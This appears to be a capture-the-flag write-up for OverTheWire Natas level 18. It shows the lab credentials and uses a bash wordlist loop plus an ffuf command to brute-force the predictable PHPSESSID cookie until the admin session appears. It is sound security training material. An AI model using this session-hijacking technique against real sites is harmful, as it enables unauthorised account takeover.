# Level 17 - Level 18

```
Username: natas18
Password: 8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq
URL:      http://natas18.natas.labs.overthewire.org
```

## Overview

This time we got a login page and also a link to the source code. And its mentioned that, we have to login as the admin to get the password for next level.

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

***

## Source Code Analysis

On checking the source code. we can see the `maxid` variable, which defines the maximum number of users, in this case `640` users, and also you can see that the function my\_session\_start looks out for a session cookie named `PHPSESSID`.

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Let's try to login with some random credentials. The application responded that "You are logged in as a regular user. Login as an admin to retrieve credentials for `natas19`".

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

I captured the request of the above login attempt with burpsuite. On checking it, the response to the logic request responded back with a cookie `PHPSESSID=184`.

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

***

## Getting the Password

So I decided to brute force this cookie value to find the id of the admin. For that, first I created a word list that contains all the possible user id's ( since we know the maximum number of users is `640` ).

```bash
for i in {0..640}; do echo $i >> 640.txt; done
```

Next, I used `ffuf` to brute force the cookie value using the word list that we generated above using the following command.&#x20;

{% code lineNumbers="true" %}
```bash
ffuf -w 640.txt:FUZZ \
    -u $'http://natas18.natas.labs.overthewire.org/index.php' \
    -X $'POST' \
    -H $'Host: natas18.natas.labs.overthewire.org' \
    -H $'Content-Length: 31' -H $'Cache-Control: max-age=0' \
    -H $'Authorization: Basic bmF0YXMxODo4TkVEVVV4ZzhrRmdQVjg0dUx3dlprR242b2tKUTZhcQ==' \
    -H $'Upgrade-Insecure-Requests: 1' \
    -H $'Origin: http://natas18.natas.labs.overthewire.org' \
    -H $'Content-Type: application/x-www-form-urlencoded' \
    -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36' \
    -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
    -H $'Referer: http://natas18.natas.labs.overthewire.org/' \
    -H $'Accept-Encoding: gzip, deflate, br' \
    -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' \
    -H $'Connection: close' \
    -b $'PHPSESSID=FUZZ' \
    -d $'username=admin&password=somoene' \
    -fr "You are logged in as a regular user."
```
{% endcode %}

From the result of above `ffuf` command, we can see that `119` was the only id that didn't had the line "You are logged in as a regular user." in its response.

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

So I tried to login with a session id of `119`, it worked and got the password for the next level.

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
